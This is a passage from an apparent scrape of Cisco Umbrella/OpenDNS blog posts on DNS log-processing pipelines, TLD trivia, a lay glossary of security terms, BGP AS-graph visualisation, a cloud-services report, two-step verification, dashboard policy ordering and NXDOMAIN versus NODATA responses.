the precision level we’re dealing with here. Again, keep in mind that we have more resolvers all around the world all comprised of several machines averaging around these numbers. Analogy with the finance world Knowing now that we have to build a log processor that will handle hundreds of data centers and apply active classification/decision techniques to the microsecond level on each one, it’s pretty hard to not see a correlation with quantitative trading in finance. (Also known as algorithmic trading ). In fact, the similarity is pretty striking. We see volumes of queries; financial analyst firms see volumes of trades. We have to deal with time series; they do too. Our data is centered around domain names (strings), and they have ticker symbols. Our logs contain additional data about the queries (Authlogs and Querylogs have different information); they see additional info about each trade. Our job consists of analyzing traffic patterns to detect anomalies and apply enforcement decisions and actions to Internet traffic; they do the same thing to compute investment strategies. They run back testing on simulations to measure the efficacy of their strategies; we replay historical logs to do pretty much the same (confusion matrix, hit rates, etc.). And finally, financial firms use external indicators (e.g., sentiment analysis on the news), while we take into account third-party APIs to cross-check our results. Obviously, there are differences also. We see a virtually infinite number of domains; they have a limited number of stock symbols. We apply classification algorithms on the domain name itself (e.g., DGAs, typo-squatting…), and for financial institutions, it’s not really relevant to do so. They also don’t really have visibility over the originators of a trade; we see the client IPs and ASNs in our logs. However, despite some important differences, it’s important to realize that a lot of modern companies that manage heavy traffic loads have to solve very similar problems, involving very similar infrastructure and will therefore go for comparable design decisions. Choosing a robust messaging system The foundation of our architecture relies on choosing the right messaging library. This will be a key factor to determine how well our data processing pipeline will perform. I will save you from all the details of a descriptive comparison between all the technology, but ZeroMQ is one of the best messaging middleware available, and it is very well known in the finance world. It also provides an amazing paradigm to build a distributed system with different message passing patterns. During my analysis, some important metrics caught my attention : Source: http://zeromq.org/results:rt-tests-v031 This benchmark was performed by sending one million messages using ZeroMQ. It shows the latency of each message on the Y axis. The graph on the left (pictured in black) shows the results with a standard Linux kernel. The one on the right shows the results obtained on a Real-Time kernel. The results also show an average latency of 23μs for the standard kernel, 33μs for the real-time one. This is in fact about three to four times faster than our Querylogs at peak time! This is looking very good so far. There is a lot to be said about real-time systems in general and I’ll try not dwell too long on the subject here. It is however important to know that the term “real-time” is often misused. By real-time, most people mean “fast” and it is actually very far from the truth. Performing in real-time means that the process follows strict time constraints and observes strongly defined deadlines . We often differentiate between soft , firm , hard, and critical time constraints; these are all different levels of deadline observance that depends on what the real-time system is trying to accomplish. A program trying to play a video stream in real-time (soft) won’t be subjected to the same constraints as the program that triggers an airbag in a car (hard) or a cooling process of a nuclear reactor (critical). However, they all have a strong sense of how much time they have allowed to complete. The graph on the right demonstrates this fact very well. The messages on average take more time to be sent (23μs to 33μs) but also never see any latency peak that would add unwanted non- determinism in our process. That being said, in telecommunications we experience network-induced latency due to the type of protocol or cable that we are using. We typically refer to such processes as near real-time . The main take-away here is that this benchmark gives us a great perspective on the overall quality, reliability, and consistency of ZeroMQ. We also learn that we could move up to stronger real-time constraints if we need to. That could very well be the case if at some point we want to move our data processing pipeline in an embedded environment for example. Designing our data processing pipeline Let’s now discuss some implementation choices: The first key aspect is modularity . In my opinion, this is the only way such a system could work. It offers plenty of flexibility and code reuse, and it makes changes easier to deploy and calibrate. The central piece of the puzzle is the avalanche node : An avalanche node can be seen as a plugin that reads messages from an input queue, applies some processing on the message data and outputs the result to an output queue. These queues can be handled in different ways. Sometimes it makes sense to keep queuing messages to make sure no data is lost, sometimes it’s smarter to opt for a fire and forget strategy where we only want to process the most recent messages. Frequently, we choose to queue the messages until a certain high water mark value. Once that size is reached, we start dropping messages. This all depends on the volumes of messages received in input, the computing performance of the plugin and how we want to forward the messages to the next node. Here are two ways you can write an avalanche plugin: Typically, every node runs in its own thread. This allows the pipeline to take full advantage of highly parallel architectures containing multiple CPUs or cores. However our pipeline design can grow very fast, and we may end up running way too many threads compared to what the system could handle for an optimal configuration. This is where the need of grouping several nodes together on the same thread becomes important via the use of plugin racks . As you can see in the previous example, the first plugin only implements a process_message method and can be part of a sequence, while the second implements a full infinite loop and therefore has to run on its own. In other words, the first is rackable, while the second isn’t. Now that we’ve learned how to create modular plugins. Let’s connect them! Avalanche uses JSON files to load pipeline definitions. For example, let’s create a very simple pipeline looking like this: Very simple. Two plugins, the first one sending messages to the second. Here is how we would define it in the JSON file: Each node is defined in the nodes JSON array with a unique ID , they are then connected in the edges section. They can also receive parameters in the attributes section. What you put in there completely depends on your plugin and the way it works. It’s just an easy way to pass external options to the plugin, which are then passed to the plugin constructor. When your pipeline has reached some level of maturity, it may look more like this: In this specific case, we have grouped some parts of the pipeline into racks . This allows us to decrease the number of threads used and gives us better clarity in the functional organization of the pipeline. In essence, a rack is a node running several plugins in sequence without any cycles. Here is how you would define a simple rack with the two previous plugins: Once you have successfully implemented your plugins and pipeline definitions, all you have to do is start your avalanche pipeline with a simple command: $ ./avalanche.py path/to/your/pipeline.json Going further We’ve now covered the first part of this data processing pipeline. Today, we are excited to share with you the core piece of our code so you can start using it and build your own custom implementations. In upcoming articles, we will share additional pieces such as custom traffic classifiers or methods to scale your pipeline on larger clusters in order to take your processing power to the next level. Hope you enjoyed this blog post, feel free to share feedback and your own custom plugins! References Avalanche Project ZeroMQ Performance Tests", "date": "2015-11-05"},
{"website": "Cisco-Umbrella", "title": "WHAT THESE COUNTRIES DID WITH THEIR TLD'S WILL SHOCK YOU!!!! : Part 1", "author": ["Vinny LaRiza"], "link": "https://umbrella.cisco.com/blog/what-these-countries-did-with-their-tlds-will-shock-you-part-1", "abstract": "TLD’s are interesting. Chances are, you’ve used one every time you’ve gone online or sent an email. For those that are unaware of what I’m referring to, TLD stands for Top Level Domain (or TOTALLY LEGIT DONUT! LOL anyone?). It’s basically the 2-5 letters after “the dot” at the end of a URL. So for instance in opendns.com, the ‘.com’ is the TLD. You’re probably familiar with most TLD’s without even thinking about it. When DNS was first unleashed back in 1983, it made the internet usable. It gave us the means to be able to use domain names like ‘opendns.com’ instead of having to type in something like 208.67.222.222 just to visit a site. These early domain names, along with their TLD’s, were initially created with specific uses in mind, some of which are still used for their initial purposes. The .com TLD in particular was initially intended for commercial organizations only. However around the mid 1990s, ICANN lifted all restrictions for registration of the .com TLD. You can now assign .com domains to just about anything under the sun. Country Code Top Level Domains, or ccTLD’s, run the same gamut as their TLD counterparts. They are normally two characters long (for example .de or .co) and are also generally used or reserved for a country, sovereign state, or dependent territory. The IANA, or Internet Assigned Numbers Authority, is responsible for determining an appropriate trustee for each ccTLD, and the idea is that the root server for the geographically labeled TLD should be located and governed by someone from the country that the TLD is said to represent (for example, .mx would have a root server in Mexico and would be governed by someone that lives there). However, with the .com domain availability getting slimmer by the minute, and also with many brands using clever ways to market themselves via “domain hacking”, many countries have turned to more commercial uses for their countries TLD (thus technically classifying them as a GccTLD or Generic Country Code Top Level Domain). And let me warn you, this rabbit hole goes pretty deep, so I’ll just mention a few of the more interesting instances that stick out. .LY – ‘ly’ are two letters that show up at the end of many words in the english language. It is also the TLD that was initially used by bitly, one of the first commercial URL shorteners to break on to the scene. However, the .ly TLD is meant to represent the country of Libya. .AM / .FM – the .am TLD is to represent Armenia, and the FM to represent the Federated States of Micronesia, however this TLD tends to be popular among radio stations. Not exactly “domain hacking” but still relevant. .IO – An acronym that commonly stands for Input/Output, .IO was adopted by many startup companies looking to add a bit of cleverness to their URL branding. However, this TLD is meant to represent the British Indian Ocean Territory. .ME – Used for many personal websites, this one is designated for Montenegro. .DJ – One of my personal favorites, this one has been adopted by DJ’s across the country hoping to add a little flavor to their personal URL branding. The country? You guessed it. DJIBOUTI! Djibouti is here. Some DJ’s might live there too, but I don’t know for sure. .LV – Marketed as the unofficial TLD for the popular city of Las Vegas, however was initially created to represent the Republic of Latvia. I’ll stop there. As time marches along, more and more ccTLD’s are being adopted for more than just location purposes. It’s probably important to mention that the ccTLD’s were initially meant to promote country targeting. For instance, it would be assumed that a domain ending in .tv would be the business of a company in Tuvalu, a small cluster of islands in the South Pacific. However, with many of the relevant branding for .com domains being bought up and/or too expensive to purchase, many brands have turned to ccTLD’s, and in some cases gTLD’s, as an alternative. The final category of TLD’s that we’ll be talking about in this segment is the gTLD, or Generic Top Level Domain (gluten-free totally legit donut). Sometimes referred to as themed TLD’s, these are pretty much 100% cosmetic and don’t seem to have much of a character limit. A gTLD is essentially any TLD that is available for unrestricted use. By technicality, there are a few that have been around for a long time that are considered to be gTLD’s. The .com TLD, for instance is, considered a gTLD as it was once meant to be utilized for commercial entities only (however, as previously mentioned, .com domains are now available to use for whatever you wish). In early 2012, ICANN decided to open the door to allow a plethora of new gTLDs to exist, with hopes to increase competition and choice in the domain name space. These new gTLD’s are no longer confined to the 3-character limit, and are often full words. So TLD’s such as .music, .casino and .blackfriday can now be registered and used, and the representative that is granted ownership of a TLD is allowed to enforce whatever restrictions they choose. This also opens the door for brand specific TLD’s, so things like .cisco, .bently or .google are now available to the TLD’s corresponding companies. A few interesting facts about these new gTLD’s: -According to MarkMonitor, the most utilized new gTLD in 2015 was .sucks, the next five most used were .porn, .adult, .news, .online and .reviews -As of 2015, there are currently 974 registered, unique gTLD’s -The longest active gTLD is 18 characters long and is .northwesternmutual Stay tuned for Part 2 of this blog for the main course, where we dig into our own data to pull stats and info about these fairly new and incredibly interesting gTLD’s!", "date": "2016-05-20"},
{"website": "Cisco-Umbrella", "title": "Honeypots, Botnets, and Spyware, Oh My!", "author": ["Kara Drapala"], "link": "https://umbrella.cisco.com/blog/security-terms", "abstract": "Sometimes, it feels like there’s a language barrier between technical and non-technical people. Terms like backdoor, rootkit, or zero-day, which may be commonplace to a security professional, often leave users in the dark. At OpenDNS, we #SpeakSecurity every day – and you can too! In this post, we define 20 key terms everyone should know: Threats Backdoor: A backdoor is an access point designed to allow quick and undetected entrance to a program or system, usually for malevolent purposes. Botnet: A botnet is a robot network – think hivemind – a collection of infected machines that are used for any number of nefarious activities, from bitcoin mining to DDoS attacks. (Looking for more details? Our Community Moderator, Vinny, recently published a fantastic blog all about botnets.) Denial of Service (DoS) Attack: This attack consumes all resources of a target so that it can no longer be used or reached, effectively taking it down. DoS attacks are designed to take a website or server offline, whether for monetary, political, or other reasons. (A DDoS , or Distributed Denial of Service attack, is carried out using two or more hosts.) Drive-by download: A drive-by download often installs malware and happens invisibly in the background, when the user visits a malicious webpage, without the user’s knowledge or consent. Often, drive-by downloads take advantage of browser or browser plug-in vulnerabilities that accept the download under the assumption that it’s a benign activity. Exploit: An exploit is an attack that takes advantage of a weakness in your system, utilizing software, bits of data, and even social engineering. To minimize exploits, it’s important to keep your software up-to-date and to be aware of social engineering attempts. Malware: Malware is a general term for any program installed on a system with the intent to corrupt, damage, or disable that system. STUXNET, Conficker, and Flashback are a few famous examples. Common types of malware include: Rootkits: A rootkit is a malicious piece of code that hides itself, prevents detection, and enables bad actors continued access to your system. If attackers gain full access to your system, they can use rootkits to continue that access over a long period of time. Trojans: A trojan is a seemingly innocuous program that acts as a front for malicious code hiding within. Trojans can do any number of things, from stealing data to allowing remote system control.  These malignant programs take their name from the famous Grecian “Trojan Horse”. Viruses: Often used as a blanket term, a virus is a piece of code – a form of malware that attaches itself to files, such as email attachments or random things you download online. The purpose of a virus is to mess with your system, whether that means deleting files or corrupting your data. Computer viruses also replicate – just like viruses in the physical world. Worms: A worm is a type of malware that clones itself in order to spread to other computers, performing various damaging actions on whatever system it infects. Unlike a virus, a worm exists as a standalone entity. Spyware: Malicious code that gathers information about you and your browsing habits, and then sends that information to a third party. MitM or Man-in-the-Middle Attack: A MitM attack is pretty much what it sounds like. An attacker will intercept, relay, and potentially change messages between two parties without their knowledge. Phishing: Phishing is is a technique that uses a trustworthy-looking communication to steal sensitive information. Like fishermen with a lure, attackers will attempt to take your personal information by phishing it from you through the use of falsified emails, forms, and web pages. Spear phishing is a form of phishing that targets one specific individual. (Think you can spot a phish in the wild? Test yourself with our quiz !) Social Engineering: A general term for any activity in which an attacker is trying to manipulate you into revealing information. Passwords, account credentials, social security numbers – we often don’t think twice about giving this information away, but who’s really on the other end of the line? Protect yourself, and think twice before sharing. Zero-day (0day): A zero day attack is when a bad actor exploits a new, previously unknown software vulnerability, for which there is no patch. Security is a cat and mouse game, and it’s a constant struggle to stay ahead of attackers. Solutions Anti-malware: Anti-malware software is designed to block, root out, and destroy viruses, worms, and other nasty things that are described in this list. It’s important to remember that this isn’t set-it-and-forget-it; updating regularly will ensure that it remains effective against new threats. Encryption: The process of scrambling messages so that they cannot be read until they are decrypted by the intended recipient. Firewall: Imagine, if you dare, all the nasty, malicious stuff on the Internet. Now imagine it’s all in your network – yikes! A firewall stands between your trusted entities and whatever lies beyond, controlling access based on security rules. Honeypot: A honeypot is essentially a trap for bad actors – a decoy machine seemingly connected to a network, just waiting to be accessed. These are monitored closely by security professionals, as they can collect valuable information about malicious activity. SIEM: An acronym made by combining two acronyms, SIEM is an umbrella term for products that deal with security information management (SIM) and security event management (SEM). This allows for aggregation of information and events into a single “pane of glass” for security teams to use.", "date": "2014-06-02"},
{"website": "Cisco-Umbrella", "title": "X-Raying the Internet Backbone: A 3D View of the AS Graph (Part 1)", "author": ["Thibault Reuille"], "link": "https://umbrella.cisco.com/blog/macro-view-asn-part-1", "abstract": "Following up with our data visualization series, today we’re going to explore a brand new idea with OpenGraphiti . Everyday, network engineers manipulate real and virtual wires to connect people in the most efficient and reliable way possible. After decades of construction and evolution, it is fascinating to step back and contemplate the shape of this giant ecosystem. In this blog post, we will share some techniques to visualize the structure of the AS network: the backbone of our modern communication. What is an Autonomous System? First things first, let’s explain a little bit what we’re dealing with here. An autonomous system (AS) is a collection of routers whose prefixes and routing policies are under common administrative control. That could be an ISP, a big company (Google, Facebook, …), a university, or any other large organization. Virtually, an AS represents a group of IP prefixes that have been assigned to that organization and exposes the same routing rules outside the AS for the whole infrastructure. An unique number is assigned for each AS, we refer to them as Autonomous System Numbers or ASNs. These are essential because the ASNs uniquely identify each network on the Internet. In order to maintain the stability and consistency of the whole network, AS’ use a well defined routing and communication protocol. The Border Gateway Protocol (or BGP) is designed for that matter. It can exchange routing information, and also reachability information between various autonomous systems. In summary, autonomous systems can be seen as high-level prefix routers. The ASN network is a dynamic graph evolving and changing everyday. It varies on the sources, but there are about 47,000 autonomous systems today linked by a multitude of routing rules. In this article we will showcase an interesting way to explore this large graph in 3D using OpenGraphiti. BGP data The first step in this visualization process is to build graph datasets based on real BGP data. There are several sources on the Internet, but for our research we’re going to use routeviews.org . The URL given in the reference section points to a repository of BGP routing tables updated every 2 hours. This repository also contains small changes on those tables updated every 15 minutes. They are stored in a binary format that requires to be decoded by the bgpdump tool. Once you decode a file, this is how it looks: ...\nTABLE_DUMP2|1415052005|B|85.114.0.217|8492|67.215.64.0/24|8492 9002 2914 36692|IGP|85.114.0.217|0|0|8492:1101 9002:9002 9002:64615|NAG||\nTABLE_DUMP2|1415052005|B|198.129.33.85|293|67.215.64.0/24|293 2914 36692|IGP|198.129.33.85|0|0||NAG||\nTABLE_DUMP2|1415052005|B|95.85.0.2|200130|67.215.64.0/24|200130 1299 3356 36692|IGP|95.85.0.2|0|0|1299:4000 1299:20000 1299:20500|NAG||\n... We will only focus on certain fields for this article, more precisely the 7th and the 8th: ...\n67.215.64.0/24|8492 9002 2914 36692\n67.215.64.0/24|293 2914 36692\n67.215.64.0/24|200130 1299 3356 36692\n... Those specific fields define the BGP routing tables: The first one is the IP prefix, the second one represents the AS path to reach it. For instance, any IP belonging to the AS 8492 wanting to reach any IP in 67.215.64.0/24 will have to go through 9002, 2914 and finally 36692. In this case, 36692 is the OpenDNS ASN. Since AS 36692 relies on AS 2914 for its routing, we say that AS 2914 is an upstream provider for 36692 and 36692 is a downstream provider for 2914. In these few lines, we observe that AS 36692 has 2 upstream providers (2914 and 3356) which also have upstream providers and so on. Here is a diagram representing the BGP routing information of those last 3 lines: Great! Now we understand how to read part of these BGP routing tables but what does that tell us? Well, if we read the complete file, we can build a list of every AS and its upstream and downstream providers. In other words, we have enough information to create the full AS graph, where each node would be an AS and each edge would represent a BGP route (upstream/downstream relationship). In our case, we chose to create a directed graph with all the upstream relationships: AS node A is directly connected to B, if B is an upstream provider of A. Now, note that this doesn’t necessarily means that A is a downstream provider for B, hence the directed relationship (See ‘directed graph’ in the reference section). Enriching the model with RIR information Let’s take it a step further: We decided to enrich our graph dataset with some country code information. To do that we had to parse some RIR data. A RIR (or Regional Internet Registry) is an organization that manages the allocation and registration of Internet resources within a particular region of the world. That include IP addresses and, of course, AS numbers. There are five of those: AfriNIC for Africa. ARIN for the United States, Canada, Antartica and some parts of the Caribbean region. APNIC for Asia, Australia, New Zealand and neighboring countries. LACNIC for Latin America and parts of the Caribbean region. RIPE NCC for Europe, Russia, the Middle East and Central Asia. You can find a couple of links to the RIR data in the references section. As you can see, this data is pretty straightforward to parse: Each line contains the ASN number and a country code which can be extracted and be used as attributes of each AS node in our graph. AS Network: Country View As we mention a little bit earlier in this article, the AS network is fairly large. Visualizing such a graph requires a process that is a bit out of the scope of this article—it will definitely be discussed in a later article. Today, we will break down our huge AS graph into smaller pieces and see what goes on at the country level. In order to understand how each country establishes its connectivity to the Internet, we designed an algorithm that extract a subgraph of all the ASNs with a given country code and their adjacent neighbors. The algorithm works as such: For each country code, we extract all BGP edges connecting at least 1 AS with country code ‘UA’ (Ukraine). We then extract all the AS nodes connected by the edges previously extracted in step 2. Finally, we store the result in a JSON file, and voilà! After running this program, we obtain a list of JSON files, each containing the subgraph of its country code and adjacent ASNs. Results & Visuals Canada The Canadian network has some interesting properties. It is big, highly connected and fairly complex. Its structure is pretty standard for any big country with a developed internet infrastructure. On the picture below we can observe its major hotspots (in bright red). The 2 main ones are: #852: TELUS Communications Inc., and #577: BACOM – Bell Canada. Singapore The Singaporean network exposes noticeable features: First, it’s obviously much smaller than the previous one. But in this one we can clearly see that even though most ASNs are Singaporean, the ‘Internet frontier’ with adjacent countries usually relies on only one or two ASNs. Example on the left of the picture with Bangladesh. This topology is indeed pretty common and is even more apparent in the next example. Ukraine Here the topology is even more apparent. This picture highlights 2 big clusters. The one on the right almost entirely Ukrainian and the one on the left with a very high number of connections being almost exclusively composed of non-Ukrainian ASNs (Russia, US, UK …). Meaning that most of Ukraine relies on that huge ASN (#9002: RETN Limited) to access the Web. Different levels of connectivity Those 3 pictures give us a fascinating and unique way to look at the topology of our Internet infrastructure at a country view. Now what does that tell us? In network engineering we can differentiate 3 types of providers: Tier 1, Tier 2 and Tier 3. Tier 1 is at the core, and offers the best communication channels—there are only couple of them in the world. Tier 2s purchase transit from Tier 1s, and usually offer access to Tier 3s who typically rely only on them. This 3-level backbone infrastructure is applied in many variations depending on the geography, politics and economy of each country. It is indeed fascinating to study. Conclusion Today, we’ve exposed a unique way to explore our Internet backbone and infrastructure. There are a lot more things to be said about it which will be discussed in another article. We will see that taking a step back and looking at a system as a whole can offer a perspective that holds the key to many topology-based detection algorithms. We hope you enjoyed reading this article and hope you’ll be waiting for the next one. In the meantime, we are happy to share with you a video of the Ukrainian network. This dataset was presented at BlackHat USA 2014 this summer: <br> References OpenGraphiti: www.opengraphiti.com Routeviews BGP data: http://routeviews.org/bgpdata/ BGPdump tool: https://bitbucket.org/ripencc/bgpdump/wiki/Home Directed Graph: http://en.wikipedia.org/wiki/Directed_graph Internet-Graph creation script: https://github.com/ThibaultReuille/internet-graph", "date": "2014-12-11"},
{"website": "Cisco-Umbrella", "title": "Cloud Services Report: A Big Ally Against Shadow IT and IoT", "author": ["Owen Lystrup"], "link": "https://umbrella.cisco.com/blog/a-big-ally-against-shadow-it", "abstract": "Last year was a big year for software vulnerabilities. More security flaws were reported in 2014 than ever. Of the more than 7,000 vulnerabilities added to the National Vulnerability Database, an estimated 83 percent of them were found in third-party software. And this trend is likely to continue in 2015. Combined with the fact that it can be incredibly hard to get insight into what unsanctioned tools and cloud services employees use on a regular basis, enterprise IT teams have good reason to be worried. Without insight, it’s difficult to track data exfiltration, or know when employees may need to reset a password because of a hack affecting a third-party tool. The good news is, if you subscribe to an OpenDNS Umbrella package, you already have access to a report that can show what services and Internet enabled devices are in your network environment, and even tie these devices to a user. The Cloud Services Report provides a snapshot summary and in depth usage logs. The worry on behalf of IT teams is what prompted OpenDNS to develop a cloud services discovery tool, which the San Francisco security company released August of 2014. Director of Engineering Dave Cornell and his team saw an opportunity to provide OpenDNS customers with an unprecedented insight into their network environments and what third-party cloud and SaaS tools employees were using. “Originally we called it the Shadow IT report,” Cornell said in an interview. “The problem we’re solving is that organizations a lot of times don’t know what tools employees are using. They’ll use whatever tool makes their job easier, condoned or not.” Discovery Now Includes IoT OpenDNS estimates that its global data centers handle two percent of the world’s DNS requests, which includes cloud services and IoT traffic passing through enterprise networks. Leveraging such a vast knowledge of the Internet the company is able to correlate traffic to cloud app usage like DropBox in near real time. OpenDNS this week released the 2015 Internet of Things in the Enterprise Report , and in conjunction Cornell and his team added a new category to the Cloud Services Report specifically for IoT. This means IT admins or security professionals auditing for internal security threats can easily determine if the Samsung Smart TV in the conference room down the hall is making calls to Korea, even when not in use . Considering the risks that come with IoT, and how pervasive they’re becoming in the enterprise, being able to tie network activity from IoT devices–and cloud services in general for that matter–to an employee identity could be incredibly valuable for IT and security professionals short on time. The Cloud Services Report can provide a list of active Internet enabled devices in your network. Easy Deployment and Off-Network Reporting Cornell says the Cloud Services Report borrows two distinct benefits from Umbrella. One is easy deployment, since the report is included with the existing Umbrella packages, and uses the data OpenDNS already sees as a result, there’s no extra work needed on behalf of IT or InfoSec teams. Once DNS requests are logged, the cloud report will do its work. The other advantage, Cornell said, is off-network reporting. Many existing cloud reporting tools work through proxies and get data from perimeter appliances like firewalls and IDS. Working with appliances and connecting data to a cloud report can be complex, but it also means they will not be able to catch activity once a device leaves a company’s network perimeter. It’s Not All FUD It’s important to note that the report’s most useful applications are not only blocking or preventing certain traffic or employee behavior. It’s also a powerful tool when justifying an IT budget, gauging use of deployed apps, or building a case to sanction a cloud solution employees already use. Cornell states that IT leaders who make use of the report will be able to draw conclusions based on actual usage. Wondering if your team prefers Webex or Google Hangouts? Take a look at the report and see what employees are using already. Useful Even When Not Proactive Security professionals, much as they would like to, don’t have a crystal ball. Unfortunately this means working frantically after a breach has occurred. And if it’s a third-party that had a breach, it can be even harder determining whose login credentials or data may have been compromised. The first step is determining who uses that third-party service. According to Cornell, this is a powerful use for the Cloud Services Report. “Say company X has a cloud service and had a major data breach,” he said. “And say all customer account logins were exposed. System administrators can use this report to find who was using this service, and advise them to change passwords.” He added that because the tool records activity in near real time, reaction times to ongoing breaches or announcements from third parties can drop significantly. If you are not a current subscriber and would like to experience the Cloud Services Report and find out what cloud tools and IoT devices your employees are using, Cisco Umbrella allows access through a free trial .", "date": "2015-06-04"},
{"website": "Cisco-Umbrella", "title": "Launching Two-Step Verification", "author": ["Philip Thomas"], "link": "https://umbrella.cisco.com/blog/launching-two-step-verification", "abstract": "What Two-step verification, also known as two-factor authentication, makes logging into online accounts safer by combining something memorized – a password – with something possessed – a time-based security code. This account security feature is now available for all customers in the Umbrella Dashboard. Why Accessing most online accounts requires a username and a password. A password alone is not a strong way of ensuring account security – passwords can be shared between accounts and people. Two-step verification adds a second step to the login process to prevent unauthorized access. After supplying the account password, the user inputs a time-based security code that is generated. This security code changes to a new seemingly random code every 30 seconds, so to gain access to an account you must physically possess the source of codes. This helps ensure that only the owner of the account may sign in. How it Works Two-step verification implements a one-time password system. The basic goal of the system is to verify that a user is who they say they are without communicating anything secret. It does this by generating security codes that change based on time. The system is designed so that, even if all of the security codes are stolen – for example, if traffic is being intercepted – then future security tokens cannot be predicted. Unlike passwords, if a security token is stolen, it is only valid for up to 30 seconds. Creating these security tokens in a deterministic but seemingly random way is accomplished by sharing a secret key between the user and the server. After this secret key is synchronized it is never shared again. The server and user combine this secret key with the current time using a hashing algorithm to generate one-time passwords. By standardizing the hashing algorithm and ensuring accurate clocks, the same six-digit password is generated by both the user and the server. If the security token sent by the user matches the one generated by the server, then it is assumed that the user has the correct secret key and is who they claim to be. How Three main methods of implementing one-time passwords exist. Because the generation of the token requires an intense mathematical hash the system is not simple. Hardware Tokens have a secret key, then calculate security tokens that they normally display on a screen. These types of devices have been a common sight on the keychains of banking employees for decades. In an SMS-based system , the server generates the token, sends it to the user via SMS, then the user inputs it into the login system. In this sense, the server sends a code to the user then makes sure that it receives back the same password the user received. The third method of one-time password generation is with a smartphone application such as Google Authenticator or Authy . After a user downloads the smart phone application, they enable two-step verification on their account and receive the secret key by scanning a QR code. In this setup, the user’s phone calculates the one-time password every time that they try to sign in. OpenDNS Implementation Two-step verification at OpenDNS began as a hackathon project . After a team of engineers built the two-step verification system in a 24-hour, coffee-fueled sprint, the project was passed onto the A-Team to ready it for production. OpenDNS supports SMS and App-based two-step verification. To enable it on your account, in the Umbrella Dashboard go to your account settings. OpenDNS provides a recovery code when you enable two-step verification. This code allows you to disable two-step verification should you lose your phone. Treat this recovery code like a password but store it separately from your account password – our engineers prefer keeping recovery codes in a Truecrypt volume on Dropbox or in 1Password . App or SMS? SMS is the easier option. It requires no application, it works on any phone that uses text messages, and if a user loses their phone then the new one can still have the same phone number. Because the text message passes through many services in plaintext before it reaches the user, this is not as secure as having the user generate their own one-time password. Phone applications are the recommended choice because the user generates their own security tokens every time they log in. In addition, the application still generates tokens without cell signal or internet. Next Steps Log into the Umbrella Dashboard and improve your account security with two-step verification.", "date": "2014-05-22"},
{"website": "Cisco-Umbrella", "title": "Best Practices for Effective Policies", "author": ["Kara Drapala"], "link": "https://umbrella.cisco.com/blog/best-practices-for-effective-policies", "abstract": "Security dashboards can be daunting. A quick Google image search reveals JPEG after JPEG of tiny font, obscure graphs, and things that go pewpew—cool, but not immediately intuitive. At OpenDNS, our user experience team strives to make the Dashboard easy to use and simple to manage, a task that begins as soon as you create an account and begin making policies. However, even the simplest tools come with pro tips, and the OpenDNS Dashboard is no exception. Below, we outline the two most important tips to keep in mind as you navigate the policy creation process, with help from Technical Support Engineer Alexander Harrison. For best results, use only the ‘Policies’ tab When you first log in to the Dashboard and visit the Configuration tab, you’ll notice a series of tabs on the left-hand side of the screen. These tabs detail different policy and option settings, which can help you manage your users, but Harrison suggests a different approach. “When I’m setting up a policy in the Dashboard, I usually stay away from Policy Settings and Block Page Settings, at least to start out,” Harrison said. “I almost forget those options are there. I do everything from the Policy Editor itself (the Policies tab, as highlighted in the image above), because it keeps everything in one place.” The Policy Editor, shown below, contains tabs for most of the same settings represented in sidebar shown above to the right: “The Policy Settings tab is mainly useful if you have multiple policies,” Harrison said. He went on to say that the Policy Settings tab allows admins to quickly find specific domain lists, instead of finding the policy the domain list applies to, saving time and effort when adjusting the lists. Block Page Settings provides an excellent example of the benefits of using the Policy Editor. If you create a new user from the sidebar Block Page Settings menu, an extra step must also be taken in the Policy Editor to enable this bypass user—whereas the same user created through the Policy Editor is applied to the policy immediately. There is a comprehensive guide to creating policies using just the Policy Editor. Looking for a tl;dr? Harrison suggests that admins who need to get policies up and running quickly go directly to step 2, section b , which covers security settings. Policy execution order matters If you have already created your policies in the Dashboard, you may feel like you’ve got everything covered. However, there is one more tip that is imperative to keep in mind: your policy order. Below, you can see the Policy Editor view. On the left hand side, you can see an arrow pointing downward. This is actually a guideline for creating policies that stack appropriately, ensuring that the correct policies are applied to the correct groups, users, and networks. According to the policy ordering tutorial, “Policies are applied based on a ‘first match’ methodology which follows a top to bottom execution order. Therefore, only the top-most policy that matches a user’s Identity will be applied, and all subsequent lower matches will be ignored .” What does that mean exactly? Harrison explains: “You want to build your catch-all policies first, and then put more specific policies above them, because if you build it upside-down with the biggest policy up top, you’re never going to use the more specific settings.” He continued, “AD users and such represent those more specific policies, followed by groups of AD users, and your network is the catch-all. But if you have the network policy up top in the policy order, it will cover everything, and your more specific policies won’t be applied. “Several people might say, ‘Oh, I can add my users to a few policies and it will stack.’ While in reality, it’s just ‘the first coin to hit the sorter applies,’ so to speak.” Once you’ve worked out the order your policies should be stacked, adjusting them is simple, just click and drag: Attention to detail goes a long way In addition to these two takeaways, one idea Harrison wanted to emphasize was attention to details in the Dashboard, such as hitting “Save” or “Allow” when creating settings. “The policy creation system and policy execution order are probably the two most important things to keep in mind when you’re working in this pane,” Harrison said. “However, there are a lot of problems that can be mitigated by ensuring that you cross your T’s and dot your I’s.” If you have any further questions about navigating the OpenDNS Dashboard, our Knowledge Base can provide a thorough walkthrough of setup. Or, you can reach our world-class support team here .", "date": "2015-07-07"},
{"website": "Cisco-Umbrella", "title": "NXDOMAIN, NODATA and debugging DNS for dual-stacked hosts", "author": ["Lucas Siba"], "link": "https://umbrella.cisco.com/blog/nxdomain-nodata-debugging-dns-dual-stacked-hosts", "abstract": "An NXDOMAIN response means there are no records, of any DNS type, for the requested domain name. A NODATA response means there are records for the requested domain name, but none of them match the record type in your request. At OpenDNS we want to help prepare everyone for the coming dual-stacked (meaning hosts will have both IPv4 and IPv6 addresses) world. In my previous post I discussed some of the issues that come from use searching domains with a dual stack host . In this post I’ll be going over exactly what DNS responses of NXDOMAIN vs NODATA mean, and why this it is important for people running dual-stacked machines to understand. There is a common misconception about what an authoritative server is actually trying to tell you when you receive an NXDOMAIN response. The NXDOMAIN response is meant to imply that there are no records, of any request type, for the requested domain name. Effectively, it’s the authority’s way of saying: “I have no information about this domain, regardless of what type of information you’re looking for” . The slightly different, but similar response of NODATA is meant to imply, there is no information, of the requested type, for the requested domain name. This is effectively like the authority saying: “I have information about the requested domain, but none of that information matches the specific type of information you’ve asked for” . A good example of when a NODATA response is used is when requesting the A (IPv4) record for “www.ipv6.awfulhak.org”. The host www.ipv6.awfulhak.org is used for testing IPv6 enabled computers, specifically because it’s authoritative server only contain a AAAA (IPv6) record for that hostname. # dig a www.ipv6.awfulhak.org\n;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 1888\n;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 0 ;; QUESTION 